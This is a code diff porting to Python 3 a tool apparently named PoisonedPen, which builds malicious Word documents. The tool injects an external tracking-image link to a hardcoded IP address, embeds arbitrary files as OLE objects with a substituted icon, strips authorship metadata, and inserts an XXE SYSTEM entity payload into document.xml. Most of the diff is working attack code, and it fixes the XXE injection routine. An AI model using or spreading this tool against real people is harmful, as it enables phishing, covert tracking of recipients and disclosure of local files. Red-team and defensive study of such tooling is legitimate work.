@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 
-import re, argparse, os, sys, tempfile, shutil, binascii, olefile, pyemf
+import re, argparse, os, sys, tempfile, shutil, binascii, olefile
 from docx import Document
 from lxml import etree
 from zipfile import ZipFile
@@ -13,13 +13,13 @@ class PoisonedPen:
 
   def __init__( self, docxpath ):
     if not os.path.isfile( docxpath ):
-      print 'No file at ' + docxpath
+      print('No file at ' + docxpath)
       return False
     self.doc = Document(docxpath)
     if self.doc:
       self.filename = docxpath
     else:
-      print 'Error parsing ' + docxpath + ' into Document object'
+      print('Error parsing ' + docxpath + ' into Document object')
       return False
 
   def get_dom( self, path='word/document.xml' ):
@@ -29,7 +29,7 @@ class PoisonedPen:
 
   # Get the raw XML markup in word/document.xml
   def get_xml( self, path='word/document.xml' ):
-    if path in self.contents.keys():
+    if path in list(self.contents.keys()):
       return self.contents[path]
     z = ZipFile( self.filename )
     return z.read(path)
@@ -37,7 +37,7 @@ class PoisonedPen:
   # Save doc
   def save( self ):
     if len(self.contents) == 0:
-      print 'No changes - save not required'
+      print('No changes - save not required')
       return False
     self.update_zip( self.contents )
 
@@ -51,14 +51,14 @@ class PoisonedPen:
       with ZipFile( tmpname, 'w' ) as zout:
         zout.comment = zin.comment
         for item in zin.infolist():
-          if item.filename not in contents.keys():
+          if item.filename not in list(contents.keys()):
             zout.writestr( item, zin.read(item.filename))
           else:
             zout.writestr( item, contents[item.filename] )
 
     os.remove( self.filename )
     if os.path.isfile( self.filename ):
-      print 'Didn\'t delete file'
+      print('Didn\'t delete file')
     os.rename( tmpname, self.filename )
 
   # Add an entry to document.xml.rels and return the rId number
@@ -70,12 +70,12 @@ class PoisonedPen:
     rid = 0
     for r in rels.findall('//'):
       i = int(r.attrib['Id'].replace('rId',''))
-      print i
+      print(i)
       if i > rid:
         rid = i
     rid += 2
     rid = 'rId' + str( rid )
-    print 'Creating element with rId ' + rid
+    print('Creating element with rId ' + rid)
     
     # Create rel
     attribs = {
@@ -89,7 +89,7 @@ class PoisonedPen:
     rels.getroot().append(rel)
     xmlstr = etree.tostring(rels,encoding='utf8',method='xml')
     # xmlstr = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/webSettings" Target="webSettings.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings" Target="settings.xml"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="theme/theme1.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/fontTable" Target="fontTable.xml"/><Relationship Id="'+rid+'" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="http://193.36.15.194/tracker.gif?id=1" TargetMode="External"/></Relationships>'
-    print xmlstr
+    print(xmlstr)
     self.contents['word/_rels/document.xml.rels'] = xmlstr
     
   
@@ -107,7 +107,7 @@ class PoisonedPen:
       if rsid not in settings:
         ok = True
     rsid = '00CB6E19'
-    print 'Random hex: ' + rsid
+    print('Random hex: ' + rsid)
     # rsid = '<w:rsid w:val="00ED3C60"/>'
     el = '<w:rsid w:val="'+rsid+'"/>'
     settings = settings.replace( '</w:rsids>', el + '</w:rsids>' )
@@ -157,13 +157,13 @@ class PoisonedPen:
     ole = olefile.OleFileIO(tmpolefile,write_mode=True)
     streams = ole.listdir()
     for s in streams: 
-      print s, ole.get_size(s)
+      print(s, ole.get_size(s))
     streamname = '\x01Ole10Native'
     with open(filepath,'rb') as f:
       size = ole.get_size(streamname)
-      print 'Size: ' + str( size )
+      print('Size: ' + str( size ))
       data = f.read().ljust(size,'\x00')
-      print 'Data size: ' + str( len( data ) )
+      print('Data size: ' + str( len( data ) ))
       ole.write_stream(streamname, data)
     
     # Insert file icon / name
@@ -176,9 +176,9 @@ class PoisonedPen:
     streamname = '\x03ObjInfo'
     with open( tmpemffile, 'rb' ) as f:
       size = ole.get_size(streamname)
-      print 'Size: ' + str( size )
+      print('Size: ' + str( size ))
       data = f.read().ljust(size,'\x00')
-      print 'Data size: ' + str( len( data ) )
+      print('Data size: ' + str( len( data ) ))
       ole.write_stream(streamname, data)
     
     ole.close()
@@ -193,7 +193,7 @@ class PoisonedPen:
 
   # Strip author info out
   def sanitise( self ):
-    print 'Stripping creator and lastModifiedBy metadata...'
+    print('Stripping creator and lastModifiedBy metadata...')
     elements = ['dc:creator','cp:lastModifiedBy']
     props = 'docProps/core.xml'
     xml = self.get_xml( props )
@@ -204,9 +204,9 @@ class PoisonedPen:
   # Insert XXE into document xml
   def insert_xxe( self, path ):
     doc = 'word/document.xml'
-    print 'Inserting XXE SYSTEM element pointing to ' + path + ' into '+doc+'. This will almost certainly prevent it from opening in any MS Office editing software...'
+    print('Inserting XXE SYSTEM element pointing to ' + path + ' into '+doc+'. This will almost certainly prevent it from opening in any MS Office editing software...')
     xml = self.get_xml( doc )
-    xml = re.sub( '(<?xml[^>]+>)', '\1<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "'+path+'" >]><foo>&xxe;</foo>', xml )
+    xml = re.sub( '(<\?xml[^>]+>)', r'\1<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "'+path+'" >]><foo>&xxe;</foo>', xml.decode('utf-8') )
     self.contents.update( { doc: xml } )
   
 
@@ -242,7 +242,7 @@ def main():
     if not args.replace:
       name, ext = os.path.splitext(docfile)
       newfile = name + newsuffix + ext
-      print 'Creating new file: ' + newfile
+      print('Creating new file: ' + newfile)
       shutil.copy( docfile, newfile )
       docfile = newfile
     
@@ -256,7 +256,7 @@ def main():
       doc.sanitise()
   
     if args.xxe:
-      doc.insert_xxe(path)
+      doc.insert_xxe(args.xxe)
 
     doc.save()
 
